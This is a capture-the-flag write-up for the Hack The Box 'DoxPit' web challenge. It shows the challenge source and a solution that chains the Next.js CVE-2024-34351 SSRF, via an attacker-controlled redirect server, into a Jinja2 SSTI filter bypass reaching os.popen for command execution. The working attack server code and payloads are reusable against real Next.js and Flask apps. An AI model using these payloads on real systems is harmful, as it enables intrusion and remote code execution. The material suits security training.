# Web

## Description

The owner of famous underground forum doxpit has been allegedly kidnapped, now that turmoil ensues it is the right time to strike and take down this appalling operation.

URL: [https://app.hackthebox.com/challenges/DoxPit](https://app.hackthebox.com/challenges/DoxPit)
## Source

### Server

`config/supervisord.conf`
```ini
[supervisord]
nodaemon=true
logfile=/dev/null
logfile_maxbytes=0
pidfile=/run/supervisord.pid

[program:next]
command=npm start
directory=/app/front-end
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:av]
command=python3 run.py
directory=/app/av
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0
```

### Frontend Application

`front-end/package.json`
```json
{
  "name": "doxpit",
  "version": "1.0.0",
  "author": "lean",
  "scripts": {
    "dev": "next dev -p 1337",
    "build": "next build",
    "start": "next start -p 1337",
    "lint": "next lint"
  },
  "dependencies": {
    "blockies-ts": "1.0.0",
    "bootstrap": "5.3.3",
    "next": "14.1.0",
    "react": "18",
    "react-dom": "18"
  },
  "devDependencies": {
    "@types/node": "20",
    "@types/react": "18",
    "@types/react-dom": "18",
    "eslint": "8",
    "eslint-config-next": "14.2.3",
    "typescript": "5"
  }
}
```

`front-end/app/serverActions.tsx`
```ts
"use server";

import { redirect } from "next/navigation";

export async function doRedirect() { redirect("/error"); }
```
### AV Application

`av/application/blueprints/routes.py`
```python
import os
from flask import Flask, redirect, render_template, render_template_string, request, Blueprint, session

from application.util.general import generate, invalid_chars
from application.util.database import Database
from application.util.scanner import scan_directory

web = Blueprint("web", __name__)

def auth_middleware(func):
  def check_user(*args, **kwargs):
    db_session = Database()

    if not session.get("loggedin"):
      if request.args.get("token") and db_session.check_token(request.args.get("token")):
        return func(*args, **kwargs)
      else:
        return redirect("/login")

    return func(*args, **kwargs)

  check_user.__name__ = func.__name__
  return check_user


@web.route("/", methods=["GET"])
def index():
  return redirect("/home")


@web.route("/login", methods=["GET"])
def login():
  username = request.args.get("username")
  password = request.args.get("password")

  if not username or not password:
    return render_template("login.html", title="log-in")

  db_session = Database()
  user_valid = db_session.check_user(username, password)

  if not user_valid:
    return render_template("error.html", title="error", error="invalid username/password"), 401

  session["loggedin"] = True
  return redirect("/home")


@web.route("/register", methods=["GET"])
def register():
  username = request.args.get("username")
  password = request.args.get("password")

  if not username or not password:
    return render_template("register.html", title="register")

  db_session = Database()
  token = generate(16)
  user_valid = db_session.create_user(username, password, token)
  
  if not user_valid:
    return render_template("error.html", title="error", error="user exists"), 401

  return render_template("error.html", title="success", error=f"User created with token: {token}"), 200


@web.route("/logout", methods=["GET"])
def logout():
    session.pop("loggedin", default=None)
    return redirect("/login")


@web.route("/home", methods=["GET", "POST"])
@auth_middleware
def feed():
  directory = request.args.get("directory")
  
  if not directory:
    dirs = os.listdir(os.getcwd())
    return render_template("index.html", title="home", dirs=dirs)

  if any(char in directory for char in invalid_chars):
    return render_template("error.html", title="error", error="invalid directory"), 400

  try:
    with open("./application/templates/scan.html", "r") as file:
        template_content = file.read()
        results = scan_directory(directory)
        template_content = template_content.replace("{{ results.date }}", results["date"])
        template_content = template_content.replace("{{ results.scanned_directory }}", results["scanned_directory"])
        return render_template_string(template_content, results=results)
        
  except Exception as e:
    return render_template("error.html", title="error", error=e), 500
```

`av/application/util/scanner.py`
```python
import hashlib, os, datetime

BLACKLIST_HASHES = {
    "9c91a1b8c4da2d7588f3aecd76cdee7dba24d95f0874f79fa711c0b0a490e273",
    "cce955a091518aefb9693ba4e103cdc31afc138c9eb9503984bf08f5f70eff46",
    "a016313bc090d337a66dcefc7cc18a889f5c1cfc721185fa9ad7038159efb728",
    "c6ec11a31d4c28480f4ee3cc744792e12d7919cfffff5b7ca86649c904b7abda",
    "170477195896fb9c6688d56d6d6a4c3d2021fbc7cf01b38d45eb86fe94016333",
    "dbd741a45d840d06d708339f9e9824f2a0d745ea6537ca44bff233ba7441bfda",
    "049f48024f31d86c5d8bf56c3da1d7be539c877ad189fb0c5aa9a228601d19eb",
    "90efa2e75e2102942fba13cb4a5744530cd85e84fcfc8d7ddccdc17081ac3f69",
    "3e17df6d4f4f9f321f783a50e1f8b364203f181274ff217b0c2a216dff63d41f",
    "98942a0affa9721c90b097c2c6a9cd02959185526c3b7a44377a25b252a16fff",
    "c6ec11a31d4c28480f4ee3cc744792e12d7919cfffff5b7ca86649c904b7abda"
}

def calculate_sha256(filepath):
    sha256_hash = hashlib.sha256()
    with open(filepath, "rb") as file:
        for byte_block in iter(lambda: file.read(4096), b""):
            sha256_hash.update(byte_block)
    return sha256_hash.hexdigest()


def scan_directory(directory):
    scan_results = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                file_hash = calculate_sha256(file_path)
                if file_hash in BLACKLIST_HASHES:
                    scan_results.append(f"Malicious file detected: {file} ({file_hash})")
                else:
                    scan_results.append(f"File is safe: {file} ({file_hash})")
            except Exception as e:
                scan_results.append(f"Error scanning file {file}: {str(e)}")

    return {
        "date": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "scanned_directory": directory,
        "report": scan_results
    }
```

`av/application/util/general.py`
```python
import os
from faker import Faker

fake = Faker()

generate = lambda x: os.urandom(x).hex()

invalid_chars = ["{{", "}}", ".", "_", "[", "]","\\", "x"]

def generate_user():
    return fake.user_name()
```
## Solution

In the source code we are given 2 applications instead of 1. The first is just some pastebin like website which does absolutely nothing and is as is.

![doxpit.png](/assets/ctf/htb/web/doxpit.png)

The second application runs on port `3000` internally and there's no way to reach it, unless we can achieve SSRF via frontend?

Searching for [Next.js](https://nextjs.org/) version (`14.1.0`) we find **[nextjs-CVE-2024-34351](https://github.com/azu/nextjs-CVE-2024-34351)**

We need endpoint like `doRedirect` which we have:
```js
export async function doRedirect() {
  redirect("/error");
}
```

And we need to trigger this endpoint:
```jsx
{filteredPastes.map((paste, index) => (
	<tr key={index}>
		<td>
			<form action={doRedirect}>
				<button className="link-light" type="submit">{paste.title}</button>
			</form>
		</td>
		<td>{paste.comments}</td>
		<td>{paste.views}</td>
		<td>{paste.createdBy}</td>
		<td>{paste.added}</td>
	</tr>
))}
```

Clicking the title triggers requests, but it's not visible on UI. Setup a server to handle SSRF requests.

[azu/nextjs-CVE-2024-34351/attacker-server/main.ts](https://github.com/azu/nextjs-CVE-2024-34351/blob/main/attacker-server/main.ts)
[Digging for SSRF in NextJS apps](https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps?ref=assetnote.io)

```python
from flask import Flask, Response, request, redirect

app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch(path):
    if request.method == 'HEAD':
        resp = Response("")
        resp.headers['Content-Type'] = 'text/x-component'
        return resp
    return redirect('http://0.0.0.0:3000')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, debug=True)
```

![doxpit-1.png](/assets/ctf/htb/web/doxpit-1.png)

Register:
```python
return redirect('http://0.0.0.0:3000/register?username=x&password=y')
```

```html
<span>User created with token: 53a4ca3d74e165263a0193fb0c7c3bf2</span>
```

::: info Note
The auth system is based on GET request which is a huge gaping security hole 💀
:::

Access home endpoint:
```python
return redirect('http://0.0.0.0:3000/home?token=53a4ca3d74e165263a0193fb0c7c3bf2')
```

```html
<h3>List of Files and Folders:</h3>
<ul>
	<li>flask_session</li>
	<li>storage.db</li>
	<li>application</li>
	<li>run.py</li>
	<li>requirements.txt</li>
	<li>venv</li>
</ul>
```

The `/home` endpoint uses mix of `render_template` and `render_template_string`
```python
with open("./application/templates/scan.html", "r") as file:
	template_content = file.read()
	results = scan_directory(directory)
	template_content = template_content.replace("{{ results.date }}", results["date"])
	template_content = template_content.replace("{{ results.scanned_directory }}", results["scanned_directory"])
	return render_template_string(template_content, results=results)
```

`render_template_string` is known to be vulnerable to SSTI injections.

The filter prevents us from performing SSTI tho
```python
if any(char in directory for char in invalid_chars):
	return render_template("error.html", title="error", error="invalid directory"), 400

# # #  
invalid_chars = ["{{", "}}", ".", "_", "[", "]","\\", "x"]
```

The injection point is directory name itself.
```python
def scan_directory(directory):
    scan_results = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                file_hash = calculate_sha256(file_path)
                if file_hash in BLACKLIST_HASHES:
                    scan_results.append(f"Malicious file detected: {file} ({file_hash})")
                else:
                    scan_results.append(f"File is safe: {file} ({file_hash})")
            except Exception as e:
                scan_results.append(f"Error scanning file {file}: {str(e)}")

    return {
        "date": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "scanned_directory": directory,
        "report": scan_results
    }
```

The injection was quite hard so I started experimenting.

[https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti#filter-bypasses](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti#filter-bypasses)

```python
from flask import Flask, request, render_template_string

INVALID_CHARS = ["{{", "}}", ".", "_", "[", "]","\\", "x"]
app = Flask(__name__)

@app.route("/exploit")
def exploit():
    payload = request.args.get('p')
    if payload:
        payload += '<br>' * 5 + '{% raw %}'
        payload += '<br>'.join(f'{char} detected' for char in INVALID_CHARS if char in payload)
        payload += '{% endraw %}'
        return render_template_string(payload)
    else:
        return "Hello, send someting inside the param 'p'!"

@app.route('/')
def home():
    html = '''
<style>body{min-height:100vh;min-width:100wh;display:flex;place-items:center;} form{ margin:0 auto;} input{min-width:100%;} </style>
<body><form action="/exploit" method="get">
        <textarea name="p" rows="24" cols="64" placeholder="Enter your data here..."></textarea><br>
        <input name="a" placeholder="a"></input><br>
        <input name="b" placeholder="b"></input><br>
        <input name="c" placeholder="c"></input><br>
        <input name="d" placeholder="d"></input><br>
        <input type="submit" value="Submit">
</form></body>
    '''
    return render_template_string(html)

if __name__ == "__main__":
    app.run(debug=True) # To autoreload if any changes are made
```

![doxpit-2.png](/assets/ctf/htb/web/doxpit-2.png)

Payload:
```python
{% set param = request|attr('args')|attr('get') %}
{% set cmd = param('d') %}
{% set app = request|attr('application') %}
{% set glob = app|attr(param('a')) %}
{% set built = glob|attr('get')(param('b')) %}
{% set imp = built|attr('get')(param('c')) %}
{% set out = imp('os')|attr('popen')(cmd)|attr('read')() %}
{% print(out) %}

a = __globals__
b = __builtins__
c = __import__
d = whoami
```

Change the server to send our payload:
```python
def catch(path):
    if request.method == 'HEAD':
        resp = Response("")
        resp.headers['Content-Type'] = 'text/x-component'
        return resp
    
    payload = '''
{% set param = request|attr('args')|attr('get') %}
{% set cmd = param('d') %}
{% set app = request|attr('application') %}
{% set glob = app|attr(param('a')) %}
{% set built = glob|attr('get')(param('b')) %}
{% set imp = built|attr('get')(param('c')) %}
{% set out = imp('os')|attr('popen')(cmd)|attr('read')() %}
{% print(out) %}
'''
    payload = {
        'token': '48b17ec0e6acc980048c5621fb725c5d',
        'a': '__globals__',
        'b': '__builtins__',
        'c': '__import__',
        'd': 'id',
        'directory': payload,
    }
    query = urlencode(payload)
    return redirect(f"http://0.0.0.0:3000/home?{query}")
```

![doxpit-3.png](/assets/ctf/htb/web/doxpit-3.png)

`ls -alh /`

![doxpit-4.png](/assets/ctf/htb/web/doxpit-4.png)

`cat /flag*`

![doxpit-5.png](/assets/ctf/htb/web/doxpit-5.png)

> Flag: `HTB{1t5_n0t_ju5t_4_fr0nt-3nd!}`

